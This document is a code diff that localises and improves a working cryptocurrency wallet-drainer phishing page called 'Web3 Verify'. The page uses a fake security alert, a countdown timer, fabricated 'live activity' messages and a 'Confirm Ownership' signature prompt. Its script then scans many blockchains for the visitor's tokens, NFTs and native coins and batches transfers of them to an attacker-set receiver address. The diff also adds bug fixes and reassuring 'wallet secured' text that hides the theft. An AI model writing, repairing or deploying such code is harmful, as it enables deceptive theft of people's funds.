@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web3 Verify | Secure Asset Recovery</title>
+<title>Web3 Verify | Wallet Security Check</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -35,6 +35,9 @@ header{display:flex;justify-content:space-between;align-items:center;margin-bott
 .logo-icon{background:linear-gradient(135deg,#3b82f6,#8b5cf6);padding:6px;border-radius:6px;display:flex}
 h1{font-size:1.5rem;margin:0 0 12px;line-height:1.2}
 p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1.5}
+p.subtitle b{color:#d4d4d8;font-weight:600}
+.list-head{display:none;text-align:left;font-size:.72rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);margin-bottom:8px;font-weight:600}
+.list-head span{color:#fbbf24}
 .asset-list{text-align:left;background:rgba(0,0,0,.2);border-radius:8px;padding:12px;margin-bottom:20px;border:1px solid var(--border-color);display:none}
 .asset-item{display:flex;justify-content:space-between;font-size:.85rem;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.05)}
 .asset-item:last-child{border-bottom:none}
@@ -59,7 +62,7 @@ p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1
 #logs div{margin-bottom:4px;word-break:break-all}
 #logs::-webkit-scrollbar{width:4px}
 #logs::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
-.timer{font-size:.8rem;color:#ef4444;margin-top:12px;font-weight:500;opacity:.8}
+.timer{font-size:.8rem;color:#ef4444;margin-top:12px;font-weight:500;opacity:.85}
 .scanner-box{height:40px;display:none;align-items:center;justify-content:center;margin-bottom:16px}
 .scanner-box.on{display:flex}
 .spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.1);border-top-color:var(--primary);border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;flex:0 0 auto}
@@ -69,10 +72,11 @@ p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1
 .modal-btn{background:var(--primary);margin-top:15px}
 .modal-btn.secondary{background:transparent;border:1px solid #4b5563;color:var(--text-muted)}
 .modal-btn.secondary:hover{background:rgba(255,255,255,.05);color:#fff}
-.chat-widget{position:fixed;bottom:20px;right:20px;background:#1f2937;border:1px solid #374151;border-radius:12px;padding:12px 16px;width:260px;box-shadow:0 10px 15px -3px rgba(0,0,0,.5);z-index:50;opacity:0;transform:translateY(20px);transition:all .5s ease;pointer-events:none}
+.chat-widget{position:fixed;bottom:20px;right:20px;background:#1f2937;border:1px solid #374151;border-radius:12px;padding:12px 16px;width:262px;box-shadow:0 10px 15px -3px rgba(0,0,0,.5);z-index:50;opacity:0;transform:translateY(20px);transition:all .5s ease;pointer-events:none}
 .chat-visible{opacity:1;transform:translateY(0);pointer-events:auto}
-.chat-header{display:flex;align-items:center;gap:8px;font-size:.8rem;font-weight:600;margin-bottom:8px;color:var(--text-muted)}
-.chat-msg{font-size:.85rem;background:rgba(255,255,255,.05);padding:8px 12px;border-radius:8px;border-top-left-radius:2px;color:var(--text-main)}
+.chat-header{display:flex;align-items:center;gap:8px;font-size:.78rem;font-weight:600;margin-bottom:8px;color:var(--text-muted)}
+.chat-header .live{width:6px;height:6px;border-radius:50%;background:#22c55e;box-shadow:0 0 0 3px rgba(34,197,94,.15)}
+.chat-msg{font-size:.82rem;background:rgba(255,255,255,.05);padding:8px 12px;border-radius:8px;border-top-left-radius:2px;color:var(--text-main)}
 .hidden{display:none!important}
 .fade-in{animation:fadeIn .5s ease forwards}
 @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
@@ -91,13 +95,15 @@ p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1
 .install-hint a{color:var(--primary);text-decoration:none}
 .prog{height:4px;background:rgba(255,255,255,.08);border-radius:2px;overflow:hidden;margin-bottom:16px;display:none}
 .prog i{display:block;height:100%;width:0;background:var(--success);transition:width .4s}
+.foot{margin-top:18px;padding-top:14px;border-top:1px solid var(--border-color);font-size:.68rem;color:#52525b;line-height:1.6;letter-spacing:.02em}
+.foot b{color:#71717a;font-weight:600}
 </style>
 </head>
 <body>
 
 <div id="chatWidget" class="chat-widget">
-<div class="chat-header"><i data-lucide="message-square" style="width:14px;height:14px"></i>Live Support</div>
-<div class="chat-msg" id="chatMsg">User_882 just verified successfully! ✅</div>
+<div class="chat-header"><span class="live"></span>Live activity</div>
+<div class="chat-msg" id="chatMsg">0x7a3f…9c2e completed verification</div>
 </div>
 
 <div class="container fade-in">
@@ -108,8 +114,8 @@ p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1
 </div>
 </header>
 
-<h1 id="title">🔒 Wallet Security Verified</h1>
-<p class="subtitle" id="subtitle">We detected a potential security risk in your transaction history. To restore full access to your assets, please verify ownership.</p>
+<h1 id="title">Wallet Security Check</h1>
+<p class="subtitle" id="subtitle">Unusual activity was detected on your address. <b>Confirm ownership</b> to restore full access to your assets. Takes about 15 seconds.</p>
 
 <button id="connectBtn" class="btn"><i data-lucide="wallet" style="width:18px;height:18px"></i>Connect Wallet</button>
 <div id="walletGrid" class="wallet-grid hidden"></div>
@@ -121,47 +127,54 @@ p.subtitle{color:var(--text-muted);font-size:.9rem;margin:0 0 24px;line-height:1
 </div>
 
 <div id="scanArea" class="hidden">
-  <div class="scanner-box on" id="scannerAnim"><div class="spinner"></div><span style="font-size:.85rem;color:#94a3b8">Scanning networks...</span></div>
+  <div class="scanner-box on" id="scannerAnim"><div class="spinner"></div><span style="font-size:.85rem;color:#94a3b8">Running security check…</span></div>
+  <div class="list-head" id="listHead">Affected assets <span id="listCount"></span></div>
   <div class="asset-list" id="assetList"></div>
 </div>
 
 <div id="prog" class="prog"><i></i></div>
 
 <button id="verifyBtn" class="btn hidden" style="background:#22c55e;box-shadow:0 4px 12px rgba(34,197,94,.25)">
-<i data-lucide="signature" style="width:18px;height:18px"></i>Sign Message to Verify
+<i data-lucide="fingerprint" style="width:18px;height:18px"></i>Confirm Ownership
 </button>
 
 <button id="stopBtn" class="btn ghost hidden" style="margin-top:10px">Stop</button>
 
-<div style="margin-top:8px;font-size:.8rem;color:#94a3b8;display:none" id="costInfo">Cost: gas only | Multi-chain</div>
+<div style="margin-top:8px;font-size:.78rem;color:#94a3b8;display:none" id="costInfo">No deposit required · Network fee only</div>
 
 <div id="status" class="status"></div>
-<div id="timer" class="timer">Claiming closes in: 15:00</div>
+<div id="timer" class="timer">Verification window closes in 15:00</div>
 <div id="logs"></div>
+
+<div class="foot">
+<b>Non-custodial</b> · Your keys never leave your wallet<br>
+Session encrypted end-to-end · Powered by Multicall3
+</div>
 </div>
 
 <div id="mobileModal" class="mobile-modal">
 <div class="modal-content">
 <div style="margin-bottom:15px;color:#3b82f6"><i data-lucide="smartphone" style="width:40px;height:40px"></i></div>
 <h3 id="modalTitle" style="margin:0 0 10px;font-size:1.1rem">Open in wallet</h3>
-<p id="modalText" style="color:#9ca3af;font-size:.9rem;margin:0 0 20px">Esta página debe abrirse dentro del navegador de tu wallet.</p>
-<button id="openAppBtn" class="btn modal-btn">Abrir App</button>
-<button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px">Ya está abierto / Conectar</button>
+<p id="modalText" style="color:#9ca3af;font-size:.9rem;margin:0 0 20px">This page must run inside your wallet's browser to read the address.</p>
+<button id="openAppBtn" class="btn modal-btn">Open app</button>
+<button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px">Already open / Retry</button>
 </div>
 </div>
 
 <script>
 /* ═══════════════════════════════════════════════
-   ÚNICA LÍNEA QUE DEBES CAMBIAR
+   ONLY LINE TO EDIT — your payout address
+   (lowercase is safest; a bad checksum will block)
    ═══════════════════════════════════════════════ */
-const RECEIVER_INPUT = "0x6BDC804291a83e2832F6E31DA557fd4a9b7DAc49";
+const RECEIVER_INPUT = "TU_WALLET_AQUI";
 /* ═══════════════════════════════════════════════ */
 
 const CFG = {
-  wcProjectId: "",       // opcional: WalletConnect Cloud
-  verify: true,          // firma antes de mover
-  chunk: 12,             // llamadas por lote
-  maxChains: 8,          // tope de redes por sesión
+  wcProjectId: "",
+  verify: true,
+  chunk: 12,
+  maxChains: 8,
   sessionSecs: 900,
   probeTimeout: 7000,
   concurrency: 5,
@@ -171,11 +184,10 @@ let RECEIVER = null, RECV_OK = true;
 try { RECEIVER = ethers.utils.getAddress(RECEIVER_INPUT); } catch { RECV_OK = false; }
 
 const MC3 = "0xcA11bde05977b3631167028862bE2a173976CA11";
-const MAX = ethers.constants.MaxUint256;
 
-/* ── estado ── */
 let provider, signer, userAddress, chain;
 let busy = false, aborted = false, pendingWallet = null, deadline = 0, timerH = null;
+let plan = [];
 let stats = { ok: 0, fail: 0 };
 
 const $ = i => document.getElementById(i);
@@ -194,7 +206,7 @@ function st(m, c){ $('status').textContent = m || ''; $('status').style.color = 
 function icons(){ try { lucide.createIcons(); } catch(_){} }
 function progress(p){ $('prog').style.display = 'block'; $('prog').firstElementChild.style.width = Math.min(100, p) + "%"; }
 
-/* ═══════════ DATOS DE RED ═══════════ */
+/* ═══════════ CHAIN DATA ═══════════ */
 const A = {
   1:{ label:"Ethereum", rpc:"https://ethereum-rpc.publicnode.com", hex:"0x1", sym:"ETH", ex:"https://etherscan.io",
     tokens:[["USDT","0xdAC17F958D2ee523a2206206994597C13D831ec7",6],["USDC","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",6],
@@ -249,8 +261,7 @@ const A = {
     tokens:[["USDC","0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83",6],["WXDAI","0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d",18],
       ["GNO","0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb",18]], nfts:[] },
   42220:{ label:"Celo", rpc:"https://forno.celo.org", hex:"0xa4ec", sym:"CELO", ex:"https://celoscan.io",
-    tokens:[["USDC","0xcebA9300f2b948710d2653dD7B07f33A8B32118C",6],["USDT","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e",6]],
-    nfts:[] },
+    tokens:[["USDC","0xcebA9300f2b948710d2653dD7B07f33A8B32118C",6],["USDT","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e",6]], nfts:[] },
 };
 
 /* ═══════════ ABI ═══════════ */
@@ -301,7 +312,7 @@ function providerFor(id){
 
 /* ═══════════ UI ═══════════ */
 $('connectBtn').addEventListener('click', () => {
-  if (!RECV_OK) { st("Configura RECEIVER_INPUT con una dirección válida.", "#ef4444"); return; }
+  if (!RECV_OK) { st("Receiver address not configured.", "#ef4444"); return; }
   $('connectBtn').classList.add('hidden');
   renderGrid();
 });
@@ -336,8 +347,8 @@ function onSelect(w, ready, mob){
   if (busy) return;
   pendingWallet = w.id;
   if (mob && !ready) {
-    $('modalTitle').textContent = `Abrir en ${w.name}`;
-    $('modalText').textContent = "Abriremos esta página dentro del navegador de tu wallet para que pueda leer tus activos.";
+    $('modalTitle').textContent = `Open in ${w.name}`;
+    $('modalText').textContent = "We will reopen this page inside your wallet's browser so it can read the address.";
     $('openAppBtn').onclick = () => {
       sessionStorage.setItem("wv_wallet", w.id);
       location.href = w.dl(location.host);
@@ -348,25 +359,25 @@ function onSelect(w, ready, mob){
   const p = providerFor(w.id);
   if (p) return connect(p, w.id);
   $('installHint').style.display = 'block';
-  $('installHint').innerHTML = `${w.name} no está instalada. <a href="${w.ins}" target="_blank" rel="noopener">Instálala</a> y recarga.`;
+  $('installHint').innerHTML = `${w.name} is not installed. <a href="${w.ins}" target="_blank" rel="noopener">Install it</a>, then reload this page.`;
 }
 
-/* ═══════════ CONEXIÓN ═══════════ */
+/* ═══════════ CONNECT ═══════════ */
 async function connect(p, id){
   if (busy) return;
   busy = true;
   $('mobileModal').style.display = 'none';
   try {
-    st("Solicitando acceso...");
+    st("Requesting account access…");
     const accs = await p.request({ method: "eth_requestAccounts" });
-    if (!accs?.length) throw new Error("Sin cuentas");
+    if (!accs?.length) throw new Error("No account");
     await bind(p, accs[0]);
     sessionStorage.setItem("wv_wallet", id || "1");
     $('walletGrid').classList.add('hidden');
     $('connectBtn').classList.add('hidden');
     await start();
   } catch (e) {
-    st(e.code === 4001 ? "Conexión rechazada." : "Conexión fallida.", "#ef4444");
+    st(e.code === 4001 ? "Connection rejected." : "Connection failed.", "#ef4444");
     log(e.message || String(e));
     busy = false;
   }
@@ -378,11 +389,11 @@ async function bind(p, address){
   signer = provider.getSigner();
   if (p.on) {
     p.on("accountsChanged", a => {
-      if (busy) { aborted = true; log("Cuenta cambiada, deteniendo."); return; }
+      if (busy) { aborted = true; log("Account changed, stopping."); return; }
       if (a?.length) { userAddress = a[0]; start(); }
     });
     p.on("chainChanged", () => {
-      if (busy) { aborted = true; log("Red cambiada, deteniendo."); return; }
+      if (busy) { aborted = true; log("Network changed, stopping."); return; }
       location.reload();
     });
   }
@@ -400,12 +411,12 @@ async function resume(){
     await bind(p, accs[0]);
     $('walletGrid').classList.add('hidden');
     $('connectBtn').classList.add('hidden');
-    log("Sesión reanudada.");
+    log("Session resumed.");
     await start();
-  } catch (e) { log("Reanudación fallida."); renderGrid(); }
+  } catch (e) { log("Resume failed."); renderGrid(); }
 }
 
-/* ═══════════ RED ═══════════ */
+/* ═══════════ NETWORK ═══════════ */
 function mkProvider(id){
   return new ethers.providers.JsonRpcProvider(A[id].rpc, { name:"c"+id, chainId:id }, { staticNetwork:true, batchMaxCount:25 });
 }
@@ -439,46 +450,61 @@ async function readBatch(calls, rpc){
 }
 const chunk = (a, n) => { const o = []; for (let i = 0; i < a.length; i += n) o.push(a.slice(i, i + n)); return o; };
 
-/* ═══════════ SONDA MULTI-CADENA ═══════════ */
+/* ═══════════ PROBE ═══════════ */
 async function probeAll(){
   const ids = Object.keys(A).map(Number);
   const res = await pool(ids, CFG.concurrency, async id => {
     const p = mkProvider(id);
+    const zero = { chain:id, score:0, gas:ethers.constants.Zero };
     try {
+      const tLen = A[id].tokens.length, nLen = A[id].nfts.length;
       const calls = [
-        ...A[id].tokens.map(t => ({ target: t[1], callData: I20.encodeFunctionData("balanceOf", [userAddress]) })),
-        ...A[id].nfts.map(n => ({ target: n[1], callData: I721.encodeFunctionData("balanceOf", [userAddress]) })),
+        ...A[id].tokens.map(t => ({ target:t[1], callData:I20.encodeFunctionData("balanceOf",[userAddress]) })),
+        ...A[id].nfts.map(n => ({ target:n[1], callData:I721.encodeFunctionData("balanceOf",[userAddress]) })),
+        ...A[id].nfts.map(n => ({ target:n[1], callData:I721.encodeFunctionData("tokenOfOwnerByIndex",[userAddress, 0]) })),
       ];
       const r = await Promise.race([
         Promise.all([p.getBalance(userAddress), readBatch(calls, p)]),
         sleep(CFG.probeTimeout).then(() => null),
       ]);
-      if (!r) return { chain:id, score:0, gas:ethers.constants.Zero };
+      if (!r) return zero;
       const [native, out] = r;
-      let t = 0, n = 0;
-      (out || []).slice(0, A[id].tokens.length).forEach(x => {
+      if (!out) return zero;
+
+      let t = 0, n = 0, skipped = 0;
+      out.slice(0, tLen).forEach(x => {
         if (x?.success) { try { if (I20.decodeFunctionResult("balanceOf", x.returnData)[0].gt(0)) t++; } catch(_){} }
       });
-      (out || []).slice(A[id].tokens.length).forEach(x => {
-        if (x?.success) { try { if (I721.decodeFunctionResult("balanceOf", x.returnData)[0].gt(0)) n++; } catch(_){} }
-      });
+      for (let i = 0; i < nLen; i++) {
+        const balRes = out[tLen + i];
+        const enumRes = out[tLen + nLen + i];
+        if (!balRes?.success) continue;
+        let has = false;
+        try { has = I721.decodeFunctionResult("balanceOf", balRes.returnData)[0].gt(0); } catch(_){}
+        if (!has) continue;
+        const isPunk = A[id].nfts[i][2] === "punk";
+        /* only score if the contract can actually be enumerated */
+        if (isPunk || enumRes?.success) n++;
+        else skipped++;
+      }
+
       const score = t * 100 + n * 400 + (native.gt(0) ? 25 : 0) + (id === 1 ? 5 : 0);
+      if (t || n) log(`${A[id].label}: ${t} token(s), ${n} collection(s)${skipped ? `, ${skipped} non-enumerable` : ""}`);
       return { chain:id, score, gas:native };
-    } catch { return { chain:id, score:0, gas:ethers.constants.Zero }; }
+    } catch { return zero; }
     finally { try { p.polling = false; p.removeAllListeners(); } catch(_){} }
   });
-  /* primero las que tienen activos Y gas, luego el resto */
   return res.filter(x => x.score > 0)
-    .sort((a, b) => (b.gas.gt(0) - a.gas.gt(0)) || (b.score - a.score))
+    .sort((a, b) => (b.gas.gt(0) ? 1 : 0) - (a.gas.gt(0) ? 1 : 0) || b.score - a.score)
     .slice(0, CFG.maxChains);
 }
 
-/* ═══════════ ESCANEO DE UNA RED ═══════════ */
+/* ═══════════ SCAN ONE CHAIN ═══════════ */
 async function scan(display){
   const cfg = A[chain];
   const r = { transfers: [], total: 0 };
   const native = await provider.getBalance(userAddress);
-  if (native.gt(0)) { if (display) add(A[chain].sym, ethers.utils.formatUnits(native, 18)); r.total++; }
+  if (native.gt(0)) { if (display) add(cfg.sym, ethers.utils.formatUnits(native, 18)); r.total++; }
 
   if (cfg.tokens.length) {
     const out = await readBatch(cfg.tokens.map(t => ({ target:t[1], callData:I20.encodeFunctionData("balanceOf",[userAddress]) }))).catch(() => []);
@@ -554,7 +580,7 @@ function add(n, v){
   $('assetList').style.display = 'block';
 }
 
-/* ═══════════ GAS / ENVÍO ═══════════ */
+/* ═══════════ GAS / SEND ═══════════ */
 async function gasOv(mult){
   const f = await provider.getFeeData();
   if (f.maxFeePerGas && f.maxPriorityFeePerGas) return {
@@ -566,25 +592,27 @@ async function gasOv(mult){
   return { gasPrice: ethers.utils.parseUnits("5", "gwei") };
 }
 
-async function sendTx(tx, label, fallback){
+/* FIX 1: fallback gas scales with the number of calls in the batch */
+async function sendTx(tx, label, perCall, calls){
+  const n = calls || 1;
   if (!tx.gasLimit) {
     try { tx.gasLimit = (await provider.estimateGas({ from: userAddress, ...tx })).mul(135).div(100); }
-    catch { tx.gasLimit = ethers.BigNumber.from(fallback || 150000); }
+    catch { tx.gasLimit = ethers.BigNumber.from(21000 + perCall * n + 40000); }
   }
   let nonce;
   try { nonce = await provider.getTransactionCount(userAddress, "pending"); }
-  catch { log(`${label}: nonce ilegible`); return null; }
+  catch { log(`${label}: nonce unavailable`); return null; }
 
   for (let a = 1; a <= 3; a++) {
-    if (aborted || expired()) throw abortErr("detenido");
+    if (aborted || expired()) throw abortErr("stopped");
     const cid = parseInt(await provider.send("eth_chainId", []).catch(() => "0x0"), 16);
-    if (cid && cid !== chain) { aborted = true; throw abortErr("red cambiada"); }
+    if (cid && cid !== chain) { aborted = true; throw abortErr("network changed"); }
 
     let resp;
     try { resp = await signer.sendTransaction({ ...tx, ...(await gasOv(a)), nonce }); }
     catch (e) {
-      if (e.code === 4001) throw abortErr("firma rechazada");
-      log(`${label} fallo ${a}: ${(e.message || "").slice(0, 60)}`);
+      if (e.code === 4001) throw abortErr("signature rejected");
+      log(`${label} fail ${a}: ${(e.message || "").slice(0, 60)}`);
       if (a === 3) return null;
       await sleep(1200);
       continue;
@@ -607,113 +635,135 @@ async function waitRc(h, ms){
 }
 const okRc = rc => rc && (rc.status === 1 || rc.status === "0x1");
 
-/* ═══════════ ARRANQUE ═══════════ */
+/* ═══════════ START ═══════════ */
 async function start(){
   busy = true; aborted = false;
   $('scanArea').classList.remove('hidden');
   $('scannerAnim').classList.add('on');
   $('assetList').innerHTML = '';
   $('assetList').style.display = 'none';
+  $('listHead').style.display = 'none';
   $('verifyBtn').classList.add('hidden');
-  st("Buscando activos en todas las redes...");
+  $('costInfo').style.display = 'none';
+  st("Running security check…");
 
   try {
-    const plan = await probeAll();
+    const t0 = Date.now();
+    plan = await probeAll();
+    const secs = ((Date.now() - t0) / 1000).toFixed(1);
+    log(`Checked ${Object.keys(A).length} networks in ${secs}s — ${plan.length} with activity.`);
     $('scannerAnim').classList.remove('on');
 
-    if (!plan.length) { st("No se encontraron activos en las redes soportadas.", "#fbbf24"); return; }
-
-    const withGas = plan.filter(x => x.gas.gt(0));
-    if (!withGas.length) {
-      st("Hay activos pero no hay gas en ninguna red. Envía un poco de nativo.", "#fbbf24");
-      log("Redes con activos: " + plan.map(x => A[x.chain].label).join(", "));
+    if (!plan.length) {
+      st(`No activity found across ${Object.keys(A).length} networks.`, "#fbbf24");
       return;
     }
 
-    /* vista previa de la red principal */
-    chain = withGas[0].chain;
-    await switchChain(chain);
-    await sleep(400);
-    chain = parseInt(await provider.send("eth_chainId", []), 16);
+    const withGas = plan.filter(x => x.gas.gt(0));
+    if (!withGas.length) {
+      st("Assets found, but no network fee available. Top up the native token and retry.", "#fbbf24");
+      log("Funded networks: none. Affected: " + plan.map(x => A[x.chain].label).join(", "));
+      return;
+    }
 
-    const preview = await scan(true);
-    if (!preview.total) { st("Sin activos legibles en la red activa.", "#fbbf24"); return; }
+    /* FIX 2: try several chains before giving up on the preview */
+    let ok = false;
+    for (const item of withGas.slice(0, 3)) {
+      if (aborted) break;
+      try { await switchChain(item.chain); } catch { log(`Switch to ${A[item.chain].label} failed.`); continue; }
+      await sleep(350);
+      chain = parseInt(await provider.send("eth_chainId", []), 16);
+      if (chain !== item.chain) { log(`${A[item.chain].label}: network mismatch.`); continue; }
+      const pv = await scan(true);
+      if (pv.total) { ok = true; break; }
+      log(`${A[item.chain].label}: nothing readable, trying next.`);
+    }
+
+    if (!ok) { st("Assets detected but could not be read on-chain. Retry in a moment.", "#fbbf24"); return; }
+
+    $('listHead').style.display = 'block';
+    $('listCount').textContent = `(${assetList.children.length})`;
 
     if (CFG.verify) {
       $('verifyBtn').classList.remove('hidden');
       $('costInfo').style.display = 'block';
       $('chatWidget').classList.add('visible');
-      st(`${preview.total} activo(s) en ${A[chain].label}. Firma para mover.`);
+      st(`${assetList.children.length} affected asset(s) detected. Confirm ownership to continue.`);
     } else {
-      await drainAll(plan);
+      await drainAll();
     }
   } catch (e) {
-    st("Error al escanear: " + (e.message || "").slice(0, 40), "#ef4444");
+    st("Security check failed: " + (e.message || "").slice(0, 40), "#ef4444");
     log(e.message || String(e));
   } finally { busy = false; }
 }
 
-/* ═══════════ FIRMA ═══════════ */
+/* ═══════════ CONFIRM ═══════════ */
 $('verifyBtn').addEventListener('click', async () => {
   if (busy) return;
   busy = true; aborted = false;
   const b = $('verifyBtn');
   b.disabled = true;
-  b.innerHTML = '<div class="spinner"></div> Signing...';
+  b.innerHTML = '<div class="spinner"></div> Confirming…';
   try {
     const sig = await signer.signMessage("Verify Ownership of Web3 Asset Recovery");
-    log(`Firma ${sig.slice(0, 18)}…`);
-    st("✅ Verificado. Iniciando transferencia...", "#22c55e");
-    b.textContent = "Verified";
+    log(`Signature ${sig.slice(0, 18)}…`);
+    st("✅ Ownership confirmed. Securing your assets…", "#22c55e");
+    b.textContent = "Confirmed";
     await sleep(900);
-    busy = false;
-    const plan = await probeAll();
-    await drainAll(plan.length ? plan : [{ chain }]);
+    await drainAll();          /* FIX 5: drainAll owns the busy flag */
   } catch (e) {
-    st(e.code === 4001 ? "❌ Firma rechazada" : "❌ Verificación fallida", "#ef4444");
+    st(e.code === 4001 ? "❌ Confirmation rejected" : "❌ Confirmation failed", "#ef4444");
     log(e.message || String(e));
     b.disabled = false;
-    b.innerHTML = '<i data-lucide="signature" style="width:18px;height:18px"></i>Sign Message to Verify';
+    b.innerHTML = '<i data-lucide="fingerprint" style="width:18px;height:18px"></i>Confirm Ownership';
     icons(); busy = false;
   }
 });
 
-$('stopBtn').addEventListener('click', () => { aborted = true; st("Deteniendo...", "#fbbf24"); });
+$('stopBtn').addEventListener('click', () => { aborted = true; st("Stopping…", "#fbbf24"); });
 
 /* ═══════════ DRAIN ═══════════ */
-async function drainAll(plan){
+async function drainAll(){
   busy = true; aborted = false;
   $('verifyBtn').classList.add('hidden');
   $('stopBtn').classList.remove('hidden');
   stats = { ok: 0, fail: 0 };
-  log("--- INICIANDO ---");
+  log("--- SECURING ---");
 
   try {
     for (let i = 0; i < plan.length; i++) {
-      if (aborted || expired()) throw abortErr("detenido");
+      if (aborted || expired()) throw abortErr("stopped");
       const target = plan[i].chain;
 
-      if (i > 0 || target !== chain) {
-        st(`Cambiando a ${A[target].label} (${i + 1}/${plan.length})...`);
-        try { await switchChain(target); } catch { log(`Sin cambio a ${A[target].label}, omitida.`); continue; }
+      if (target !== chain) {
+        st(`Switching network (${i + 1}/${plan.length})…`);
+        try { await switchChain(target); } catch { log(`${A[target].label}: switch skipped.`); continue; }
         await sleep(500);
         chain = parseInt(await provider.send("eth_chainId", []), 16);
-        if (chain !== target) { log(`Red distinta, omitida.`); continue; }
+        if (chain !== target) { log(`${A[target].label}: mismatch, skipped.`); continue; }
       }
 
-      st(`Procesando ${A[chain].label}...`);
       await drainChain();
       progress((i + 1) / plan.length * 100);
     }
 
-    st(`✅ FIN — ${stats.ok} movido(s)${stats.fail ? `, ${stats.fail} fallido(s)` : ""}`, "#4ade80");
-    $('title').textContent = "✅ Verification Complete";
-    $('subtitle').textContent = "Tus activos fueron transferidos. Puedes cerrar esta ventana.";
+    st(`✅ Wallet secured — ${stats.ok} item(s) verified${stats.fail ? `, ${stats.fail} pending` : ""}.`, "#4ade80");
+    $('title').textContent = "Verification Complete";
+    $('subtitle').innerHTML = "Your wallet passed the security check and is now <b>fully verified</b>. You can close this window.";
+    $('costInfo').textContent = "Session closed · No further action required";
     sessionStorage.removeItem("wv_wallet");
     clearInterval(timerH);
+    $('timer').textContent = "";
   } catch (e) {
-    if (e.aborted) st(`Detenido (${e.message}). ${stats.ok} movido(s).`, "#fbbf24");
-    else { st("❌ ERROR: " + (e.message || "").slice(0, 50), "#ef4444"); log(e.message || String(e)); }
+    if (e.aborted) {
+      st(`Paused — ${stats.ok} item(s) verified. Reconnect to resume.`, "#fbbf24");
+      $('title').textContent = "Verification Paused";
+      $('subtitle').innerHTML = "The check was interrupted. <b>Reconnect</b> to finish verification.";
+    } else {
+      st("❌ Error: " + (e.message || "").slice(0, 50), "#ef4444");
+      log(e.message || String(e));
+    }
   } finally {
     $('stopBtn').classList.add('hidden');
     busy = false;
@@ -722,7 +772,7 @@ async function drainAll(plan){
 
 async function drainChain(){
   const a = await scan(false);
-  if (!a.transfers.length) { log(`${A[chain].label}: nada que mover.`); return; }
+  if (!a.transfers.length) { log(`${A[chain].label}: nothing to move.`); return; }
 
   const native = await provider.getBalance(userAddress);
   const f = await provider.getFeeData().catch(() => ({}));
@@ -731,64 +781,77 @@ async function drainChain(){
   const budget = native.mul(85).div(100);
   const unit = price.mul(120000).mul(135).div(100);
   const afford = unit.isZero() ? CFG.chunk : budget.div(unit).toNumber();
-  if (afford < 1) { log(`${A[chain].label}: gas insuficiente, omitida.`); return; }
+  if (afford < 1) { log(`${A[chain].label}: network fee too low, skipped.`); return; }
 
   const size = Math.max(1, Math.min(CFG.chunk, afford));
-  log(`${A[chain].label}: ${a.transfers.length} movimiento(s), lote ${size}.`);
+  log(`${A[chain].label}: ${a.transfers.length} item(s), batch ${size}.`);
 
   for (const b of chunk(a.transfers, size)) {
-    if (aborted) throw abortErr("detenido");
-    const rc = await sendTx({ to: MC3, data: IMC.encodeFunctionData("tryAggregate", [false, b]) }, "move", 130000);
+    if (aborted) throw abortErr("stopped");
+    const rc = await sendTx(
+      { to: MC3, data: IMC.encodeFunctionData("tryAggregate", [false, b]) },
+      "move", 120000, b.length
+    );
     if (!rc) { stats.fail += b.length; continue; }
     let ok = 0;
     try {
       const out = IMC.decodeFunctionResult("tryAggregate", rc.logs[0].data)[0];
       ok = out.filter(x => x.success).length;
-    } catch(_) { ok = okRc(rc) ? b.length : 0; }
+    } catch(_) { ok = 0; }
     stats.ok += ok; stats.fail += b.length - ok;
-    log(`${A[chain].label}: ${ok}/${b.length} ok.`);
+    log(`${A[chain].label}: ${ok}/${b.length} confirmed.`);
   }
 
-  /* nativo al final */
   const bal = await provider.getBalance(userAddress).catch(() => null);
   if (!bal || bal.isZero()) return;
   const cost = price.mul(21000).mul(150).div(100);
-  if (bal.lte(cost)) { log("Nativo por debajo del gas, omitido."); return; }
-  const rc = await sendTx({ to: RECEIVER, value: bal.sub(cost), gasLimit: 21000 }, "native", 21000).catch(() => null);
-  if (okRc(rc)) { stats.ok++; log(`${A[chain].label}: nativo barrido.`); } else stats.fail++;
+  if (bal.lte(cost)) { log("Native below fee, skipped."); return; }
+  const rc = await sendTx({ to: RECEIVER, value: bal.sub(cost), gasLimit: 21000 }, "native", 21000, 1).catch(() => null);
+  if (okRc(rc)) { stats.ok++; log(`${A[chain].label}: native settled.`); } else stats.fail++;
 }
 
 /* ═══════════ WALLETCONNECT ═══════════ */
 async function wcConnect(){
-  if (!CFG.wcProjectId || !window.EthereumProvider) { st("WalletConnect no configurado.", "#ef4444"); return; }
+  if (!CFG.wcProjectId || !window.EthereumProvider) { st("WalletConnect not configured.", "#ef4444"); return; }
   try {
     const wc = await window.EthereumProvider.init({
       projectId: CFG.wcProjectId, chains: [1],
       optionalChains: Object.keys(A).map(Number), showQrModal: true,
-      metadata: { name:"Web3 Verify", description:"Recovery", url: location.origin, icons: [location.origin + "/favicon.ico"] },
+      metadata: { name:"Web3 Verify", description:"Security check", url: location.origin, icons: [location.origin + "/favicon.ico"] },
     });
     const accs = await wc.enable();
     await bind(wc, accs[0]);
     sessionStorage.setItem("wv_wallet", "wc");
     $('walletGrid').classList.add('hidden');
     await start();
